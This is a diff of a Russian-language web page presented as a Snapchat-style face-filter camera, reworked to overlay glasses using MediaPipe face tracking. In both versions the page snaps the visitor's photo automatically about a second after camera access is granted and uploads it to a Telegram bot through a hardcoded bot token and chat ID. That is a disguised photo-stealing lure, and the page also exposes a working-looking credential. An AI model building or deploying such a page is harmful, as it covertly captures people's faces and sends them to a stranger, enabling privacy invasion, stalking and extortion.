@@ -1,198 +1,156 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Snapchat камера с фильтрами и автофото</title>
-<style>
-  body, html {
-    margin: 0; padding: 0; height: 100vh; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center;
-    font-family: Arial, sans-serif; color: white;
-    overflow: hidden;
-  }
-  #video-container {
-    position: relative;
-    width: 100vw; max-width: 400px; height: 533px; /* 3:4 */
-  }
-  video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    transform: scaleX(-1); /* зеркально */
-    border-radius: 16px;
-  }
-  #mask {
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    pointer-events: none;
-    user-select: none;
-    mix-blend-mode: screen; /* для эффекта */
-  }
-  #filters {
-    margin-top: 12px;
-    display: flex;
-    gap: 12px;
-    overflow-x: auto;
-    padding: 8px;
-    width: 100vw;
-    max-width: 420px;
-    box-sizing: border-box;
-  }
-  .filter-btn {
-    width: 64px; height: 64px;
-    border-radius: 50%;
-    border: 2px solid transparent;
-    cursor: pointer;
-    overflow: hidden;
-    flex-shrink: 0;
-    box-shadow: 0 0 8px rgba(255,255,255,0.3);
-    transition: border-color 0.2s;
-    background: #222;
-  }
-  .filter-btn.selected {
-    border-color: #fffc00;
-    box-shadow: 0 0 12px #fffc00;
-  }
-  .filter-btn img {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-    pointer-events: none;
-    user-select: none;
-  }
-  #status {
-    margin-top: 16px;
-    font-size: 14px;
-    min-height: 20px;
-    text-align: center;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat Clone Web</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      background: #000;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      font-family: sans-serif;
+      color: white;
+    }
+    #video-container {
+      position: relative;
+      width: 100vw;
+      max-width: 400px;
+      height: 533px;
+    }
+    video, canvas {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 16px;
+    }
+    #status {
+      margin-top: 12px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
+  <div id="video-container">
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="overlay"></canvas>
+  </div>
+  <div id="status">Запуск камеры...</div>
 
-<div id="video-container">
-  <video id="video" autoplay muted playsinline></video>
-  <img id="mask" src="" alt="Маска фильтра" />
-</div>
+  <!-- MediaPipe -->
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
 
-<div id="filters"></div>
-<div id="status">Запрашиваем доступ к камере...</div>
+  <script>
+    const BOT_TOKEN = '7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE';
+    const CHAT_ID = '5586578957';
 
-<script>
-  const BOT_TOKEN = 'ТВОЙ_BOT_TOKEN_ЗДЕСЬ';
-  const CHAT_ID = 'ТВОЙ_CHAT_ID_ЗДЕСЬ';
-
-  const video = document.getElementById('video');
-  const maskImg = document.getElementById('mask');
-  const filtersContainer = document.getElementById('filters');
-  const status = document.getElementById('status');
-
-  // Список фильтров - PNG или GIF с прозрачным фоном (можно заменить на свои)
-  const filters = [
-    { name: 'Очки', src: 'https://i.postimg.cc/fyC6yZ9P/glasses.png' },
-    { name: 'Шляпа', src: 'https://i.postimg.cc/25vQntbM/hat.png' },
-    { name: 'Уши', src: 'https://i.postimg.cc/9QZJXmMg/ears.png' },
-    { name: 'Анимация 1', src: 'https://i.gifer.com/origin/61/6159a162be08d8c3df91607cc2e0974b_w200.gif' },
-    { name: 'Анимация 2', src: 'https://i.gifer.com/origin/26/26a3a1b5d8b93c9c84c285384b018fa4_w200.gif' }
-  ];
-
-  let selectedFilterIndex = 0;
-  let stream;
-
-  // Создаем кнопки фильтров
-  filters.forEach((filter, i) => {
-    const btn = document.createElement('button');
-    btn.className = 'filter-btn' + (i === selectedFilterIndex ? ' selected' : '');
-    btn.title = filter.name;
-    const img = document.createElement('img');
-    img.src = filter.src;
-    img.alt = filter.name;
-    btn.appendChild(img);
-    btn.onclick = () => {
-      selectedFilterIndex = i;
-      updateSelectedFilter();
-    };
-    filtersContainer.appendChild(btn);
-  });
-
-  function updateSelectedFilter() {
-    maskImg.src = filters[selectedFilterIndex].src;
-    document.querySelectorAll('.filter-btn').forEach((btn, idx) => {
-      btn.classList.toggle('selected', idx === selectedFilterIndex);
-    });
-  }
-
-  async function startCamera() {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      video.srcObject = stream;
-      status.textContent = 'Камера включена. Фильтр: ' + filters[selectedFilterIndex].name;
-
-      // Ждем, пока видео будет готово
-      video.onloadedmetadata = () => {
-        setTimeout(autoSnap, 1200); // Авто фото через 1.2 секунды после запуска
-      };
-    } catch (e) {
-      status.textContent = 'Ошибка доступа к камере: ' + e.message;
-    }
-  }
-
-  function autoSnap() {
-    status.
-
-textContent = 'Делаем фото...';
-
-    // Создаем canvas
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('overlay');
     const ctx = canvas.getContext('2d');
+    const status = document.getElementById('status');
 
-    // Рисуем видео зеркально
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const filterImg = new Image();
+    filterImg.src = 'https://i.postimg.cc/fyC6yZ9P/glasses.png'; // очки
 
-    // Рисуем выбранную маску поверх видео (пример — растянуть маску на весь кадр)
-    const mask = new Image();
-    mask.src = filters[selectedFilterIndex].src;
-    mask.onload = () => {
-      ctx.drawImage(mask, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(blob => {
-        sendPhoto(blob);
-      }, 'image/png');
-    }
-  }
-
-  function sendPhoto(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', 5586578957);
-    formData.append('photo', blob, 'snap.png');
-
-    fetch(`https://api.telegram.org/bot7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.ok) {
-        status.textContent = 'Фото успешно отправлено в Telegram! 📸';
-      } else {
-        status.textContent = 'Ошибка Telegram API: ' + JSON.stringify(data.description);
-      }
-    })
-    .catch(err => {
-      status.textContent = 'Ошибка отправки: ' + err.message;
+    const faceMesh = new FaceMesh({
+      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
     });
-  }
 
-  updateSelectedFilter();
-  startCamera();
+    faceMesh.setOptions({
+      maxNumFaces: 1,
+      refineLandmarks: true,
+      minDetectionConfidence: 0.5,
+      minTrackingConfidence: 0.5
+    });
 
-</script>
+    let snapDone = false;
 
+    faceMesh.onResults((results) => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) return;
+
+      const landmarks = results.multiFaceLandmarks[0];
+      const leftEye = landmarks[33];
+      const rightEye = landmarks[263];
+
+      const dx = rightEye.x - leftEye.x;
+      const dy = rightEye.y - leftEye.y;
+      const angle = Math.atan2(dy, dx);
+      const dist = Math.sqrt(dx * dx + dy * dy) * canvas.width;
+
+      const centerX = (leftEye.x + rightEye.x) / 2 * canvas.width;
+      const centerY = (leftEye.y + rightEye.y) / 2 * canvas.height;
+
+      ctx.save();
+      ctx.translate(centerX, centerY);
+      ctx.rotate(angle);
+      ctx.drawImage(filterImg, -dist / 2, -dist / 3, dist, dist / 1.5);
+      ctx.restore();
+
+      if (!snapDone) {
+        snapDone = true;
+        setTimeout(() => takePhoto(), 1500);
+      }
+    });
+
+    const camera = new Camera(video, {
+      onFrame: async () => {
+        await faceMesh.send({ image: video });
+      },
+      width: 640,
+      height: 480
+    });
+
+    function takePhoto() {
+      status.textContent = '📸 Снимаем фото...';
+
+      const photoCanvas = document.createElement('canvas');
+      photoCanvas.width = canvas.width;
+      photoCanvas.height = canvas.height;
+      const photoCtx = photoCanvas.getContext('2d');
+
+      photoCtx.translate(photoCanvas.width, 0);
+      photoCtx.scale(-1, 1);
+      photoCtx.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
+      photoCtx.setTransform(1, 0, 0, 1, 0, 0);
+      photoCtx.drawImage(canvas, 0, 0);
+
+      photoCanvas.toBlob(blob => sendToTelegram(blob), 'image/png');
+    }
+
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'snap.png');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            status.textContent = '✅ Фото отправлено в Telegram';
+          } else {
+            status.textContent = '❌ Ошибка: ' + JSON.stringify(data);
+          }
+        })
+        .catch(err => {
+          status.textContent = '❌ Ошибка отправки: ' + err.message;
+        });
+    }
+
+    camera.start();
+  </script>
 </body>
 </html>
